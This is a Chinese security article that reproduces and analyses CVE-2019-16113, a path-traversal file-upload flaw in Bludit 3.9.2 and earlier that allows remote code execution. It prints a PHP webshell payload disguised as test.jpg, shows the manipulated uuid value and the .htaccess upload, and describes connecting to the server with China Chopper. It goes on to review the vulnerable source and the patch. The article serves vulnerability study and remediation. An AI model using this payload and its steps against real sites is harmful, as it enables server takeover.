> 原文链接: https://www.anquanke.com//post/id/197105 


# 关于Bludit远程任意代码执行漏洞的复现、利用及详细分析


                                阅读量   
                                **1062470**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01b8ba4d96cc89f5ce.png)](https://p3.ssl.qhimg.com/t01b8ba4d96cc89f5ce.png)



## 前言

**Bludit是一款多语言轻量级的网站CMS系统，它能够让你简单快速的建立一个博客或者是网站。CVE-2019-16113曝出在Bludit&lt;=3.9.2的版本中，攻击者可以通过定制uuid值将文件上传到指定的路径，然后通过bl-kernel/ajax/upload-images.php远程执行任意代码。本文将对该漏洞进行详细的分析。**



## 实验环境

1.渗透主机：kali-linux-2018.3-vm-i386<br>
2.目标主机：Debian9.6 x64<br>
3.软件版本：Bludit 3.9.2



## 漏洞复现

1.在Bludit中利用管理员用户admin创建一个角色为作者的用户test，密码为test123。

2.利用test/test123登录Bludit，打开“撰写新文章”栏目，点击“图片”按钮，进行图片的上传：

[![](https://p0.ssl.qhimg.com/t01093b96f4e56afc54.png)](https://p0.ssl.qhimg.com/t01093b96f4e56afc54.png)

2.1尝试上传一个常规图片文件，图片上传成功，如下图所示：

[![](https://p1.ssl.qhimg.com/t0182235a82a23721b2.png)](https://p1.ssl.qhimg.com/t0182235a82a23721b2.png)

2.2尝试上传一个任意的php文件，上传未成功，应当是系统对用户上传的文件进行了筛查和过滤，如下图所示：

[![](https://p2.ssl.qhimg.com/t017d3342deaf9e8488.png)](https://p2.ssl.qhimg.com/t017d3342deaf9e8488.png)

3.通过Burpsuite截取上传图片的http数据包，在Repeater模块中将文件名修改为”test.jpg”，内容修改为

```
&lt;?php $test='&lt;?php $a=$_POST["cmd"];assert($a); ?&gt;';file_put_contents("shell.php", $test);?&gt;
```

uuid值修改为`../../tmp`，然后发送数据包给Bludit，如下图所示：

[![](https://p5.ssl.qhimg.com/t013fc8f76ae47c6520.png)](https://p5.ssl.qhimg.com/t013fc8f76ae47c6520.png)

4.再次在Repeater模块中作如下修改，上传.htaccess到指定路径，若不上传.htaccess文件，那么将无法执行恶意图片生成后门php文件，如下图所示：

[![](https://p4.ssl.qhimg.com/t01a4b53fbe601ae576.png)](https://p4.ssl.qhimg.com/t01a4b53fbe601ae576.png)

5.在浏览器中输入如下url，访问之前上传的恶意图片，以使php代码执行并且生成后门文件shell.php：

[http://192.168.110.133/bludit/bl-content/tmp/test.jpg](http://192.168.110.133/bludit/bl-content/tmp/test.jpg)

6.使用中国菜刀连接后门文件shell.php，成功连接到Bludit服务器，可以利用菜刀对服务器文件进行新建、修改、上传以及删除等等操作，如下图所示：

[![](https://p1.ssl.qhimg.com/t013c135a967250a5f2.png)](https://p1.ssl.qhimg.com/t013c135a967250a5f2.png)

[![](https://p0.ssl.qhimg.com/t01c06759fd5673deeb.png)](https://p0.ssl.qhimg.com/t01c06759fd5673deeb.png)

7.通过进一步尝试，发现可以在Repeater模块中直接上传php后门文件，并不需要刻意使用图片文件的后缀名，这里虽然服务器返回错误信息，但是后门文件确实是上传成功的，可以用菜刀去连接（菜刀的连接过程这里不再赘述），如下图所示：

[![](https://p3.ssl.qhimg.com/t01f9b7f881cbde4adb.png)](https://p3.ssl.qhimg.com/t01f9b7f881cbde4adb.png)



## 漏洞分析

1.问题源码具体如下：

```
&lt;?php defined('BLUDIT') or die('Bludit CMS.');
header('Content-Type: application/json');

$uuid = empty($_POST['uuid']) ? false : $_POST['uuid'];

if ($uuid &amp;&amp; IMAGE_RESTRICT) `{`
    $imageDirectory = PATH_UPLOADS_PAGES.$uuid.DS;
    $thumbnailDirectory = $imageDirectory.'thumbnails'.DS;
    if (!Filesystem::directoryExists($thumbnailDirectory)) `{`
        Filesystem::mkdir($thumbnailDirectory, true);
    `}`
`}` else `{`
    $imageDirectory = PATH_UPLOADS;
    $thumbnailDirectory = PATH_UPLOADS_THUMBNAILS;
`}`

$images = array();
foreach ($_FILES['images']['name'] as $uuid=&gt;$filename) `{`
    if ($_FILES['images']['error'][$uuid] != 0) `{`
        $message = $L-&gt;g('Maximum load file size allowed:').' '.ini_get('upload_max_filesize');
        Log::set($message, LOG_TYPE_ERROR);
        ajaxResponse(1, $message);
    `}`

    $filename = urldecode($filename);

    Filesystem::mv($_FILES['images']['tmp_name'][$uuid], PATH_TMP.$filename);

    $image = transformImage(PATH_TMP.$filename, $imageDirectory, $thumbnailDirectory);
    if ($image) `{`
        $filename = Filesystem::filename($image);
        array_push($images, $filename);
    `}` else `{`
        $message = $L-&gt;g('File type is not supported. Allowed types:').' '.implode(', ',$GLOBALS['ALLOWED_IMG_EXTENSION']);
        Log::set($message, LOG_TYPE_ERROR);
        ajaxResponse(1, $message);
    `}`
`}`

ajaxResponse(0, 'Images uploaded.', array(
    'images'=&gt;$images
));
?&gt;
```

2.其中下面这段使用POST方式获取uuid参数，然后没有对uuid做任何的校验和过滤，直接拼接到imageDirectory中，这就导致了path traversal的产生，攻击者可以通过定制uuid参数值，将定制文件上传到任意目录。

```
$uuid = empty($_POST['uuid']) ? false : $_POST['uuid'];

if ($uuid &amp;&amp; IMAGE_RESTRICT) `{`
    $imageDirectory = PATH_UPLOADS_PAGES.$uuid.DS;
    $thumbnailDirectory = $imageDirectory.'thumbnails'.DS;
    if (!Filesystem::directoryExists($thumbnailDirectory)) `{`
        Filesystem::mkdir($thumbnailDirectory, true);
    `}`
`}` else `{`
    $imageDirectory = PATH_UPLOADS;
    $thumbnailDirectory = PATH_UPLOADS_THUMBNAILS;
`}`
```

3.`$image = transformImage(PATH_TMP.$filename, $imageDirectory, $thumbnailDirectory);`

这条语句使用函数transformImage来校验文件扩展名和生成文件缩略图。函数transformImage代码具体如下：

```
function transformImage($file, $imageDir, $thumbnailDir=false) `{`
    global $site;

    $fileExtension = Filesystem::extension($file);
    $fileExtension = Text::lowercase($fileExtension);
    if (!in_array($fileExtension, $GLOBALS['ALLOWED_IMG_EXTENSION']) ) `{`
        return false;
    `}`

    $filename = Filesystem::filename($file);
    $nextFilename = Filesystem::nextFilename($imageDir, $filename);

    $image = $imageDir.$nextFilename;
    Filesystem::mv($file, $image);
    chmod($image, 0644);

    if (!empty($thumbnailDir)) `{`
        if ($fileExtension == 'svg') `{`
            symlink($image, $thumbnailDir.$nextFilename);
        `}` else `{`
            $Image = new Image();
            $Image-&gt;setImage($image, $site-&gt;thumbnailWidth(), $site-&gt;thumbnailHeight(), 'crop');
            $Image-&gt;saveImage($thumbnailDir.$nextFilename, $site-&gt;thumbnailQuality(), true);
        `}`
    `}`

    return $image;
`}`
```

```
if (!in_array($fileExtension, $GLOBALS['ALLOWED_IMG_EXTENSION']) ) `{`
  return false;
 `}`
```

其中这条if条件判断语句用于检测用户上传文件的后缀名是否在允许的范围内，若不在，则返回false，那么transformImage函数也执行结束，返回false。

ALLOWED_IMG_EXTENSION是一个全局参数，内容如下：

`$GLOBALS['ALLOWED_IMG_EXTENSION'] = array('gif', 'png', 'jpg', 'jpeg', 'svg');`

4.在漏洞复现环节，存在一个问题，为什么在页面上直接上传php文件，服务器返回信息“文件类型不支持”且文件上传也不成功，而通过Burpsuite代理上传php文件，虽然显示文件类型不支持，但是却上传成功呢？下面来具体分析：

通过在浏览器中分析页面源码，发现jQuery中存在一个函数uploadImages，该函数通过如下for循环进行图片后缀名的合规性校验，如果用户上传的文件不符合要求，那么函数直接返回false，恶意文件也就无法通过页面上传。

```
for (var i=0; i &lt; images.length; i++) `{`
        const validImageTypes = ['image/gif', 'image/jpeg', 'image/png', 'image/svg+xml'];
        if (!validImageTypes.includes(images[i].type)) `{`
            showMediaAlert("&lt;?php echo $L-&gt;g('File type is not supported. Allowed types:').' '.implode(', ',$GLOBALS['ALLOWED_IMG_EXTENSION']) ?&gt;");
            return false;
        `}`

        if (images[i].size &gt; UPLOAD_MAX_FILESIZE) `{`
            showMediaAlert("&lt;?php echo $L-&gt;g('Maximum load file size allowed:').' '.ini_get('upload_max_filesize') ?&gt;");
            return false;
        `}`
    `}`;
```

为什么通过Burpsuite代理上传php文件就可以？不是也通过transformImage函数做过后缀名检测吗？其实transformImage函数并未起到作用。首先通过Burpsuite可以绕过页面的jQuery检测代码，这样恶意文件就顺利进入了后端。然后在调用transformImage函数之前有这样一条语句

```
Filesystem::mv($_FILES['images']['tmp_name'][$uuid], PATH_TMP.$filename);
```

它把用户上传的文件移动到了Bludit的tmp文件夹中（具体路径是/bludit/bl-content/tmp）。此时恶意文件已经存在于tmp文件夹中，接着再调用transformImage函数，然而transformImage虽然对文件后缀名做了检测，但是没有删除不合规文件，因此通过Burpsuite代理上传php文件可以成功。



## 漏洞修复

1.针对upload-images.php，主要改动有以下四点：

1.1在设置imageDirectory之前，检测uuid中是否存在DS（即目录分隔符）：

```
if ($uuid) `{`
    if (Text::stringContains($uuid, DS, false)) `{`
        $message = 'Path traversal detected.';
        Log::set($message, LOG_TYPE_ERROR);
        ajaxResponse(1, $message);
    `}`
`}`
```

1.2增加代码检测filename中是否存在DS（即目录分隔符）：

```
if (Text::stringContains($filename, DS, false)) `{`
        $message = 'Path traversal detected.';
        Log::set($message, LOG_TYPE_ERROR);
        ajaxResponse(1, $message);
    `}`
```

1.3在mv操作之前，检测文件扩展名的合规性：

```
$fileExtension = Filesystem::extension($filename);
    $fileExtension = Text::lowercase($fileExtension);
    if (!in_array($fileExtension, $GLOBALS['ALLOWED_IMG_EXTENSION']) ) `{`
        $message = $L-&gt;g('File type is not supported. Allowed types:').' '.implode(', ',$GLOBALS['ALLOWED_IMG_EXTENSION']);
        Log::set($message, LOG_TYPE_ERROR);
        ajaxResponse(1, $message);
    `}`
```

1.4在调用transformImage函数之后，删除tmp文件夹中的用户上传的文件：

`Filesystem::rmfile(PATH_TMP.$filename);`



## 结束语

所有的用户输入都是不可信的，就算在前端对用户输入做了过滤，也可能被攻击者利用多种方式绕过，因此后端的筛查与过滤就极其重要。关于Bludit中的文件上传导致任意代码执行漏洞的分析就到这里。
